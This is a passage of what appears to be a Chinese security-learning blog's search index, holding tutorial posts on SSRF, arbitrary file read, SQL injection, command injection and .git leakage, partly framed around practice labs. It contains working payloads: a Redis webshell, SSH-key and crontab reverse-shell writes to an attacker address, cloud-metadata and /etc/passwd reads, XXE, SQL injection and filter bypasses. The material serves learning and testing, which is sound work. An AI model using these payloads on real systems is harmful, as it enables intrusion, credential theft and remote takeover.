这篇文章会继续更新下去","categories":[],"tags":[]},{"title":"SSRF","slug":"SSRF","date":"2025-09-23T09:07:34.000Z","updated":"2025-10-10T11:19:15.446Z","comments":true,"path":"2025/09/SSRF/","permalink":"http://ziddzide.io/2025/09/SSRF/","excerpt":"","text":"SSRF-服务端请求伪造原理解析服务器端请求伪造是一个Web安全漏洞,允许攻击者导致服务器端应用程序向意外位置发出请求。 在典型的SSRF攻击中,攻击者可能导致服务器连接到组织基础设施内的仅内部服务。在其他情况下,他们可能能够迫使服务器连接到任意外部系统。这可能会泄露敏感数据,例如授权凭据。 针对本地服务器的攻击在针对服务器的SSRF攻击中,攻击者通过其循环回流网络接口,导致应用程序向托管应用程序的服务器发出HTTP请求。这通常涉及向URL提供像这样的主机名127.0.0.1(一个指向循环回转适配器的预留IP地址)或localhost(同一适配器常用的名称)。 例如,设想一个购物应用程序,允许用户查看某商品是否在特定商店中有库存。要提供库存信息,应用程序必须查询各种后端REST API。通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现。当用户查看商品的库存状态时,其浏览器会提出以下请求: 1POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1 这导致服务器向指定的网址发出请求,重新找回股票状态,并将其归还给用户。 在此示例中,攻击者可以修改请求以指定服务器本地的 URL: 1POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin 服务器获取内容/adminURL 并将其返回给用户。 攻击者可以访问/adminURL,但管理功能通常仅对经过身份验证的用户开放。这意味着攻击者不会看到任何相关内容。但是,如果请求/adminURL 来自本地机器,常规访问控制被绕过。该应用程序授予对管理功能的完全访问权限,因为该请求似乎来自一个可信的位置。 核心攻击流程​​漏洞入口​ 1购物应用存在SSRF漏洞：前端允许用户通过stockApi参数指定后端API地址（http://stock.weliketoshop.net:8080/...），服务器会无条件访问该地址并返回内容。 ​攻击者篡改请求​ 1攻击者将stockApi参数值改为服务器本地的管理接口： 12stockApi=http://localhost/adminlocalhost或 127.0.0.1指向服务器的回环接口（Loopback Adapter）​，即服务器自身。 ​服务器执行恶意请求​ 1服务器收到请求后，向自己的http://localhost/admin发送请求，获取管理页面的内容（如HTML源码）。 ​绕过访问控制​ 管理页面&#x2F;admin原本需要身份验证，但服务器设计时认为： ​​“来自本地的请求一定是可信的”​​ 因此直接返回了敏感内容，攻击者无需登录即可获取管理功能。 应用程序信任本地请求核心原因访问控制分层失效（前置组件绕过） ​典型架构​：外部请求 → 防火墙&#x2F;WAF → 反向代理（如Nginx） → 应用服务器​访问控制可能仅部署在反向代理层（例如Nginx配置allow 127.0.0.1; deny all）。 ​漏洞根源​：当应用服务器通过SSRF访问localhost/admin时，请求绕过反向代理，直接来自内部网络（源IP&#x3D;127.0.0.1）。→ 反向代理的ACL规则失效，应用服务器未做二次验证。 灾难恢复后门（运维便利性陷阱) ​设计初衷​：管理员忘记密码时，可通过服务器本地执行命令紧急恢复系统（例如curl http://localhost/resetAdminPassword）。 ​致命假设​：“能物理登录服务器的人一定是可信管理员”。→ 忽略网络层面的本地请求可能被伪造（SSRF）。 端口隔离​ ​常见配置​： 用户访问端口：公网IP:80（对外开放） 管理接口端口：127.0.0.1:8080（仅本地可访问） URL结构解析1234567URL = schema://[userinfo]@[host:port][path]?[query]#[fragment]# schema 资源所需要的协议# host 表示服务器,可以是域名,也可以是ipv4或者ipv6地址# port 表示端口# path 路径# query 查询字符串,将用户输入传递给服务器,例如?id = 1# fragment 原始字符 编码后 说明 : %3A 冒号 / %2F 斜杠 / %2F 斜杠 / %2F 斜杠 ? %3F 问号 = %3D 等号 案例说明靶场连接 csdn靶场解析 过程说明 首先观察具体商品页面存在查看库存的功能 抓包更改api接口为127.0.0.1&#x2F;admin,出现部分管理员页面,点击删除卡洛斯 抓包后发现url逻辑是/damin/delete?username=carlos 再次对库存查找的功能抓包,修改api接口为以上的url 针对其他后端系统的攻击针对其他后端系统的SSRF攻击 在某些情况下,应用程序服务器能够与无法直接访问的后端系统进行交互。这些系统通常具有不可路由的私有IP地址。后端系统通常受到网络拓扑保护,因此其安全态势通常较弱。在许多情况下,内部后端系统包含一些敏感功能,任何能够与系统交互的人均可在无需身份验证的情况下访问。 在前面的示例中,假设后端URL处存在一个管理接口 https://192.168.0.68/admin。攻击者可以提交以下请求以利用SSRF漏洞,并访问管理界面 检测服务器端口开放程度简单脚本探测端口及ip通过编写简单的脚本逐一试探服务器端口是否开放,通过返回true或者false来判断 1234567891011import requests# 扫描192.168.1.0/24网段示例for i in range(1, 255): try: url = f&quot;http://vulnerable-site.com/ssrf.php?url=http://192.168.1.&#123;i&#125;&quot; response = requests.get(url, timeout=2) if response.status_code == 200: print(f&quot;发现存活主机: 192.168.1.&#123;i&#125;&quot;) except: pass 检测漏洞存在尝试schema的协议类型 123file:// # 从文件系统中获取文件dirt:// # 字典服务器协议gopher:// # 分布式文档传递 例如: 123http://vulnerable-site.com/ssrf.php?url=file:///etc/hostshttp://vulnerable-site.com/ssrf.php?url=file:///proc/net/routehttp://vulnerable-site.com/ssrf.php?url=file:///proc/net/arp 利用服务器自身泄露的信息​这是更高效的方法——让服务器告诉你它所在的内网环境​： ​读取网络配置文件​： 1看上文的schema ​查看网络接口信息​： 1http://vulnerable-site.com/ssrf.php?url=file:///proc/net/dev ​3. 云环境特殊探测​如果目标运行在云服务器上，攻击者会尝试访问云元数据接口​ 123http://vulnerable-site.com/ssrf.php?url=http://169.254.169.254/http://vulnerable-site.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/这个特殊地址（169.254.169.254）是云平台的标准元数据服务地址，可能泄露大量敏感信息包括内网IP。 ​4. 基于响应差异的探测​即使没有直接回显（盲SSRF），攻击者仍能通过以下方式推断 123456​响应时间差异​：连接存活主机的响应通常比连接不存在IP更快​错误信息差异​：不同服务会返回不同的错误消息​DNS查询​：诱导服务器向攻击者控制的DNS服务器发起查询 使用gopher协议攻击redisredis一般运行在内网,大多绑定在127.0.0.1:6379,一般空口令 1. 未授权访问与弱口令Redis 默认安装后没有密码认证​（requirepass参数为空），或者管理员设置了弱口令，导致攻击者可以直接连接 。 ​检测与连接​： 使用 redis-cli 尝试连接，如果不需要密码即可进入交互式命令行，则存在未授权访问redis-cli -h &lt;目标IP&gt;# 如果设置了密码，可以尝试使用 hydra 进行暴力破解hydra -P &#x2F;path&#x2F;to&#x2F;password_list.txt redis:&#x2F;&#x2F;&lt;目标IP&gt; 2. 写入 Webshell此方法需要在目标服务器上存在一个 Redis 进程有写入权限的 Web 目录​（如 /var/www/html）。 ​利用步骤​： 123456789#接至目标 Redisredis-cli -h &lt;目标IP&gt;# 配置 Redis 的持久化存储目录为 Web 目录目标IP:6379&gt; CONFIG SET dir /var/www/html# 设置持久化数据库文件名为一个 PHP 文件目标IP:6379&gt; CONFIG SET dbfilename shell.php# 写入一个简单的 PHP WebShell目标IP:6379&gt; SET webshell &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;# 保存当前内存数据到磁盘文件（即写入 WebShell）目标IP:6379&gt; SAVE# 退出目标IP:6379&gt; QUIT 成功后，可通过浏览器访问 http://&lt;目标IP&gt;/shell.php，并使用中国蚁剑等工具连接。 3. 写入 SSH 公钥此方法通常需要 ​Redis 以 root 权限运行，从而能向 root 用户的 SSH 授权密钥文件写入数据。 ​利用步骤​： ​在攻击机上生成 SSH 密钥对​（如果还没有）：ssh-keygen -t rsa这将生成 id_rsa（私钥）和 id_rsa.pub（公钥）。 ​将公钥写入特定格式的文件​（为了处理 Redis 写入的额外字符，通常需要添加换行）：(echo -e “\\n\\n”; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e “\\n\\n”) &gt; key.txt ​通过 Redis 将公钥写入目标机的 authorized_keys 文件​： 12345678910#将公钥内容作为值写入 Redis 的一个键cat key.txt | redis-cli -h &lt;目标IP&gt; -x set ssh_key# 连接 Redisredis-cli -h &lt;目标IP&gt;# 配置 Redis 数据目录为 /root/.ssh/目标IP:6379&gt; CONFIG SET dir /root/.ssh# 设置数据库文件名为 authorized_keys目标IP:6379&gt; CONFIG SET dbfilename authorized_keys# 保存目标IP:6379&gt; SAVE ​使用私钥进行 SSH 免密登录​：ssh -i ~&#x2F;.ssh&#x2F;id_rsa root@&lt;目标IP&gt; 4. 写入定时任务 (Crontab)此方法同样通常需要 ​Redis 以 root 权限运行，从而能向系统定时任务目录写入计划任务。 ​利用步骤​： 12345678910111213#连接至目标 Redisredis-cli -h &lt;目标IP&gt;# 配置 Redis 数据目录为定时任务目录（通常是 /var/spool/cron/ 或 /etc/cron.d/）目标IP:6379&gt; CONFIG SET dir /var/spool/cron# 设置数据库文件名为对应用户名（例如 root）目标IP:6379&gt; CONFIG SET dbfilename root# 写入一个每分钟执行一次的反向 Shell 命令# 注意：这里的 IP 和端口需要替换为你的攻击机监听地址和端口目标IP:6379&gt; SET revshell &quot;\\n\\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;你的IP&gt;/&lt;你的端口&gt; 0&gt;&amp;1\\n\\n&quot;# 保存目标IP:6379&gt; SAVE同时在你的攻击机上监听指定端口：nc -lvnp &lt;你的端口&gt; 5. 主从复制利用这种方法更为高级，通过让目标 Redis 服务器作为从节点同步来自攻击者控制的恶意主节点的数据，从而加载恶意的 Redis 模块来实现远程代码执行。 ​利用思路​： 攻击者在自己的机器上搭建一个恶意的 Redis 主服务器，并准备好包含恶意代码的 RDB 文件。 通过未授权访问等方式，让目标 Redis 执行 SLAVEOF &lt;攻击者IP&gt; 6379命令，使其成为恶意主节点的从节点。 目标 Redis 会同步恶意主节点的数据，加载恶意 RDB 文件，从而执行预设的代码。通常会使用自动化工具（如 redis-rogue-server）来完成。","categories":[],"tags":[]},{"title":"任意文件读取漏洞","slug":"任意文件读取漏洞","date":"2025-09-22T15:31:11.000Z","updated":"2025-10-10T11:19:15.453Z","comments":true,"path":"2025/09/任意文件读取漏洞/","permalink":"http://ziddzide.io/2025/09/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"任意文件读取漏洞原理攻击者利用一些手段读取服务器上开发者不允许读到的文件，常作为资产信息搜集的重要手段，在每种可部署到web应用程序的程序语言中几乎都存在 任意文件读取漏洞常见触发点web语言PHP有关文件读取函数file_get_content(),file(),fopen()函数及其文件指针操作函数fread(),fgets()等 文件包含函数include(),require(),include_once(),require_once()等 PHP系统命令:exec(),system()等 PHP协议-wrapper:例如: 12http://host:port/xxx --通过http协议访问远程服务器上对应的文件php://协议 12http://127.0.0.1/?p=php://filter/read=convert.base64-encode/resource=flag#利用php的filter机制在页面输出想要的文件的base64编码 PHP攻击姿势经典攻击​：http://网站.com/download.php?file=../../../../etc/passwd ​PHP​：用 php://filter协议把文件用Base64编码读出来，避免代码执行，直接看源码 12http://网站.com/index.php?page=php://filter/convert.base64-encode/resource=config.php#拿到Base64编码后的内容，解码一下就能看到源码里的数据库密码 python容易出现读取非预期文件的情况 JavaFileInputStream,XXE文件读取函数导致的漏洞以及Java有些模块也支持file://协议 XXE解析XML时，如果没配置好，攻击者可以构造一个特殊的XML，让服务器去读任意文件。 1234&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE hack [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;#如果解析,文件将会被输出到&lt;root&gt;标签里 其他rubyRails框架导致漏洞 nodeexpress模块导致漏洞 中间件&#x2F;服务器相关Nginx错误配置配置alias时没写对，就会产生路径穿越 123location /files/ &#123; alias /var/www/uploads/;&#125; 怎么利用？​​：访问 http://网站.com/files../etc/passwd Nginx会把/files替换成/var/www/uploads/，拼出来就成了/var/www/uploads/../etc/passwd，也就是/var/www/etc/passwd。如果这个文件不存在，可能就直接返回错误信息，泄露了部分路径。 数据库MySQL​：如果数据库用户权限很高（有FILE权限），可以利用SQL注入执行LOAD_FILE()函数读文件。 1http://网站.com/news.php?id=1 UNION SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;)--+ ​PostgreSQL​：类似，用pg_read_file()函数。 软连接如果网站允许用户上传文件，攻击者可以上传一个软链接文件​（类似于Windows的快捷方式），这个链接指向/etc/passwd等敏感文件。如果网站提供了“下载”功能，且没有判断文件类型，就可能直接把这个软链接指向的真实文件给下载下来。 FFmpegDocker-API如果服务器的Docker端口（2375）暴露在外且没设置密码，攻击者可以远程控制Docker，然后启动一个容器，把宿主机的根目录/挂载到容器里，然后直接读宿主机的所有文件。 客户端相关浏览器&#x2F;Flash XSS浏览器&#x2F;XSS​XSS本身不能读服务器上的文件，但它可以： 读取用户浏览器里缓存的数据。 诱导用户上传文件，然后偷偷把文件内容发到攻击者的服务器（比如读取用户的敏感文档）。 MarkDown语法解析器 XSS有些网站允许你用Markdown语法写文章，但它的解析器不够安全，没能过滤掉危险的代码。 这是个链接 探测 案例说明问题: 1&lt;img src=&quot;/resources/images/rating1.png&quot;&gt; #说明内部资源是通过系统文件查询的 F12查看页面源代码 解决方案: 1用brup suite截取获取这张图片的请求,更改报文中,filename=/resources/images/rating1.png的请求,改编为filename=../../../../etc/passwd 提升: 如果网站禁用了遍历序列,可以尝试用绝对地址&#x2F;etc&#x2F;passwd 附言1../ #表示返回上一级目录,而/var/www/一般会是目录路径,所以使用多个../返回如果不保险可以使用多个","categories":[],"tags":[]},{"title":"SQL注入--基础篇","slug":"SQL注入-基础篇","date":"2025-09-13T13:49:27.000Z","updated":"2025-10-10T11:19:15.442Z","comments":true,"path":"2025/09/SQL注入-基础篇/","permalink":"http://ziddzide.io/2025/09/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80%E7%AF%87/","excerpt":"","text":"SQL注入 SQL注入基础对用户参数过滤不严格导致输入数据可以影响预设查询功能的导致数据库被入侵的一种技术 SQL注入技巧 判断列数:order by 5 --+ 闭合符号的判断数字型注入id=1 and 1=2 判断是否是数字型,如果通过无闭合符号 字符型注入 1&#39; and &#39;1&#39;=&#39;1 ，1&#39; and &#39;1&#39;=&#39;2 判断是否是字符型 搜索型注入 某个商品名称%&#39; and 1=1 and &#39;%&#39;=&#39; （这个语句的功能就相当于普通SQL注入的 and 1=1） 因为,SQL的格式是 select * from database.table where users like ‘%某个商品名称%’ and 1&#x3D;1 and ‘%’&#x3D;’%’ 其他常见闭合(&#39;&#39;) or (&quot;&quot;) 数字型注入和union注入判断手段在url中id=1改变为id=2-1 利用方式基本查询手段：后缀union seclect users,pwds from wp_users 破解表名·字段：table_name–表名 table_schema–数据库名 information_schema–所有表名,字段,数据库 因此查询表名 1union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 查询字段: 1union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;wp_users&#x27; 附言:limit1,1限制查询手段,取查询结果中第一条数据之后的第一条数据 字符型注入和布尔盲注字符型 判断手段在url中改变id=3-1无效,但是改变为id=2a有效时,SQL强制将2a转换为2,a被强制转换为0 字符型 利用方式在url中用单引号闭合前面的单引号,再用#(%23或--%20)去注释掉后面的语句,但是所用格式应该要是url编码 例如id=2%27%23 空格–%20 单引号–%27 #–%23 查询语句 1%27 union select 1,group_concat(concat(user,0x7e,pwd)) from wp_user limit 1,1%23--+ 但这样只会输出单一数据,如果想要输出完整数据: 1union select 1,group_concat(concat(username,0x7e,password)) from database_name.tablename --+ 布尔盲注技术单一字符:通过and逻辑运算符连接id=1&#39; and &#39;f&#39;&lt;&#39;n&#39; 前者为真,所以判断后者即可,利用二分完成 长数据:利用mid(),substring(),substr()函数进行操作即可. 实际案例: 12http://example.com/example.php?id=1&#x27; and(select(mid(select concat(user,0x7e,pwd) from wp_user),1,1)) = &#x27;a&#x27;#其中的第一个1表示数据的第一位,判断是否第一位是a 时间盲注技术其本质与布尔盲注一致 报错注入为了方便调试,有的网站会开启错误调试信息,只要利用注入手段让页面上显示错误信息,内容是执行sql语句后的结果 实际案例: 1id = 1&#x27; or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23 SQL注入点SELECT注入注入点在select_expr可以使用时间盲注的方法,也可以用as别名的方式注入 例如 1?id=(select pwd from users) as title 注入点在table_reference1依然可以用as别名的方式进行注入 注入点在where或者having之后1判断有无引号包括使用基础注入手段,例如union即可 注入点在group by或者order by之后针对性测试,利用时间盲注手段也可. 注入点在limit之后略 insert注入注入点位于tbl_name通过注释掉后面的语句尝试直接插入特定的数据 1table=users values(20,&#x27;newadmin&#x27;,&#x27;newpass&#x27;)--+ 注入点位于values例如下面这种情况 1users values(20,&#x27;newadmin&#x27;,&#x27;可控位置&#x27;) 往里面直接插入select语句即可,但查询结果必须是单个元素 update注入可利用修改多个字段的数据 其他注入点利用方式与select相似 注入绕过和防御手段空格过滤空格包括它的url码被替换成其他字符的情况 原sql代码案例 1$id=str_replace(&quot; &quot;,&quot;&quot;,$id); 此时能够代替空格的空白字符有: 1234567%0a%0b%0c%0d%09%a0 (在特定字符集才可使用)以及/**/和括号等 select过滤将select字符转化为空的情况,可以使用双写绕过 1select -&gt; selselectect 大小写匹配1大小写混写绕过: seLeCt 正则匹配正则匹配关键字\\bselect\\b可用形如/*!50000select*/的方式绕过 替换了单引号或双引号,忘记反斜杠在第一个控制点输入\\在第二个可控点输入--+,使第二个可控点逃狱 逃逸引号注入的重点在逃逸引号,如果开发者提前将所有字符转义,还有一些特殊情况可以完成注入 编码解码特异注入点二次注入字符串截断SQLMAP工具使用1234567sqlmap -u 网址url #查看注入点sqlmap -u 网址url --dbs #查看所有数据库sqlmap -u 网址url --current-db #查看当前使用的数据库sqlmap -u 网址url -D &#x27;数据库名&#x27; --tables #查看表名sqlmap -u 网址url -D &#x27;数据库名&#x27; -T &#x27;表名&#x27; --columns #查看字段sqlmap -u 网址url -D &#x27;数据库名&#x27; -T &#x27;表名&#x27; --dump #查看数据#这些是基本操作,其余请自主查询 1apt install sqlmap #下载方式直接在kali中命令行下载即可,面对一些工具下载慢的问题请及时kali换源 1#关于注入点的判断sqlmap中也会有显示 附言UNION注入需要注意的事项:UNION联合注入需要保持列数一致性,也就是UNION SELECT 后面的值需要是子查询或其他的形式,如果是group_concat则是一个完整的查询语句,会有语法上的错误 只有 ​返回单行单列值（标量）的表达式​ 才能作为 UNION的列值。常见形式包括： ​1. 子查询（Subquery）​​SELECT 1, (SELECT group_concat(table_name) FROM ...), 3 ​要求​：子查询必须返回 ​单行单列值​（如聚合函数 GROUP_CONCAT()、COUNT()）。 ​2. 标量函数（Scalar Functions）SELECT 1, database(), 3 -- 返回当前数据库名（单值） SELECT 1, CONCAT(user(), &#39;@&#39;, host()), 3 -- 拼接字符串（单值） ​3. 字面量（Literals）或列引用SELECT 1, &#39;text&#39;, 3 -- 字符串字面量 SELECT 1, column_name, 3 -- 引用表中的列 ​4. 条件表达式（CASE&#x2F;IF）​​SELECT 1, CASE WHEN ... THEN &#39;A&#39; ELSE &#39;B&#39; END, 3 ​总结​ ​UNION列值必须为单值​：子查询、函数、字面量均可，但 ​不能是独立查询语句。 ​SQL 注入中的高频错误​： 混淆子查询与独立查询； 未封装聚合函数（如 GROUP_CONCAT()必须搭配子查询）。 ​调试技巧​：在靶场中开启数据库错误日志，观察具体语法错误提示。","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://ziddzide.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"命令执行漏洞","slug":"rce","date":"2025-09-13T13:49:27.000Z","updated":"2025-10-10T11:26:44.618Z","comments":true,"path":"2025/09/rce/","permalink":"http://ziddzide.io/2025/09/rce/","excerpt":"","text":"命令执行漏洞漏洞原理命令执行原理调用函数执行命令未做过滤，注入恶意命令 执行基础1.转义字符 windows：^ Linux:\\ 2.多条命令执行 Windows:&amp;&amp; || %0a linux:&amp;&amp; || ; $() %0a %0d，还有&#96;&#96; 例如在Windows中执行 1noexist || echo helloworld #neoxist程序不存在,or执行后面的echo 3.注释符号 Windows: :: Linux:# 命令执行漏洞绕过1.空格过滤为空i.利用不可见字符代替,例如一一尝试%00~&amp;ff ii.字符串截取获取空格 a.在Windows下:%programfile:~10,1%,~表示截取字符,获取programfie环境变量的值,并且从第十个获取一个字符串 b.在Linux下:$IFS$9 2.黑名单过滤","categories":[],"tags":[{"name":"rce","slug":"rce","permalink":"http://ziddzide.io/tags/rce/"}]},{"title":"敏感信息泄露-git","slug":"敏感信息泄露-git","date":"2025-09-11T15:53:37.000Z","updated":"2025-10-10T11:19:15.455Z","comments":true,"path":"2025/09/敏感信息泄露-git/","permalink":"http://ziddzide.io/2025/09/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-git/","excerpt":"","text":"敏感信息泄露–git(1)git泄露目录扫描-确认git是否存在dirsearch工具示例:python dirsearch.py -u &lt;目标URL&gt; -e &lt;扩展名&gt;,如果存在访问 http://target.com/.git/HEAD，返回 ref: refs/heads/master或类似内容，则证实泄露存在。 dirb工具1.虽然 .git是目录，但有时可以尝试扫描可能存在的 .git/目录下的特定文件，如 HEAD、config。 dirb http://target.com -X .git 2..git是一个目录，其内部还有子目录和文件。使用 -r参数可以让 Dirb 对发现的目录进行递归扫描，从而更深入地发现 .git目录内部的结构 dirb http://target.com /path/to/your/git_wordlist.txt -r 3.如果目标站点需要登录才能访问某些路径，你可以使用获取到的 Cookie 进行认证扫描 dirb http://target.com -c &quot;session_id=yoursessioncookievalue&quot; 4.一个结合了自定义字典和递归扫描的命令示例如下： dirb http://target.com /path/to/SecLists/Discovery/Web-Content/git.txt -r -o scan_output.txt SecLists​工具下载 SecLists（如果尚未安装） git clone https://github.com/danielmiessler/SecLists.git 使用 SecLists 中针对 Git 的字典进行扫描 dirb http://target.com /path/to/SecLists/Discovery/Web-Content/git.txt 常见利用手段1.常规泄露：使用工具scrabble在其目录下./scrabble http://example.com/将git输出到对应的目录 2.git回滚：经过常规泄露步骤后执行git reset --hard HEAD^跳跃到上一个版本 或者利用git log -stat查看哪些文件收到了修改,再用git diff HEAD commit-id查看当前版本和提交之间的区别 3.git分支：一条时间线是一个分支,主干分支默认master,如果flag藏在其他的分支里需要用到githacker,执行python Githacker.py http://example.com/.git.后查看本地生成的文件夹,执行git log --all或者git branch -v命令只能看到master的信息,此时执行git reflog查看checkout的记录,假如多出一个x分支. 手动下载分支的head信息保存到.git/refs/heads/x中–执行命令wget http://example.com/.git/refs/heads/x 获取完整的.git目录使用工具使用工具（如 GitHacker、dvcs-ripper）或递归下载，将整个 .git目录拖取到本地 wget递归下载.git使用 wget 递归下载 .git 目录示例 wget --recursive --no-parent --no-host-directories http://target.com/.git/ 识别分支1.查看 .git&#x2F;refs&#x2F;heads&#x2F; 下的所有文件，每个文件通常对应一个分支名 ls -la .git/refs/heads/ 2.检查 git reflog记录，有时能发现曾经切换分支的痕迹，提示其他分支的存在 git reflog 手动恢复特定分支需要手动下载该分支的HEAD信息并放入本地 .git/refs/heads/目录下 手动下载 secret 分支的 HEAD 引用文件 wget http://target.com/.git/refs/heads/secret -O .git/refs/heads/secret 之后，你可以使用 git checkout secret来切换到这个分支，查看该分支上的代码和文件。有些工具（如 GitHacker）在获取分支引用后，可能需要重新运行或利用其功能来获取该分支对应的对象文件。 Git泄露的常见利用方式与工具 ​利用方式​ ​说明​ ​常用工具&#x2F;命令​ ​源码完全恢复​ 获取完整项目源代码，进行白盒审计 GitHack, GitHacker, dvcs-ripper ​历史记录挖掘​ 查看所有提交历史，寻找敏感信息泄露（如密码、密钥被提交后又“删除”） git log -p``git diff &lt;commit-id&gt; ​暂存区(index)检查​ 查看已被 git add但未提交的文件内容 git ls-files --stage``git show :&lt;filename&gt; ​贮藏区(stash)检查​ 恢复开发者临时贮藏（git stash）的未提交工作内容 git stash list``git stash show -p &lt;stash@\\{0\\}&gt; ​分支探查​ 如上文所述，检查所有分支内容 git branch -a, git checkout &lt;branch-name&gt; 附言 文件夹名称 作用 COMMIT_EDITMSG 保存最新的commit message，Git系统不会用到这个文件，只是给用户一个参考 config GIt仓库的配置文件 description 仓库的描述信息，主要给gitweb等git托管系统使用 HEAD 包含一个分支（branch）的引用，通过这个文件Git可以得到下一次commit的parent hooks 存放一些shell脚本，可以设置特定的git命令后触发相应的脚本；在搭建gitweb系统或其他git托管系统会用到 hook scriptindex 这个文件就是暂存区（stage），是一个二进制文件 info 包含仓库的一些信息 logs 保存所有更新的引用记录 objects 所有的Git对象都会存放在这个目录中，对象的SHA1哈希值的前两位是文件夹名称，后38位作为对象文件名 refs 这个目录一般包括三个子文件夹，heads、remotes和tags，heads中的文件标识了项目中的各个分支指向的当前commit ORIG_HEAD HEAD指针的前一个状态","categories":[],"tags":[{"name":"敏感信息泄露","slug":"敏感信息泄露","permalink":"http://ziddzide.io/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"}]}],"categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://ziddzide.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"rce","slug":"rce","permalink":"http://ziddzide.io/tags/rce/"},{"name":"敏感信息泄露","slug":"敏感信息泄露","permalink":"http://ziddzide.io/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"}]}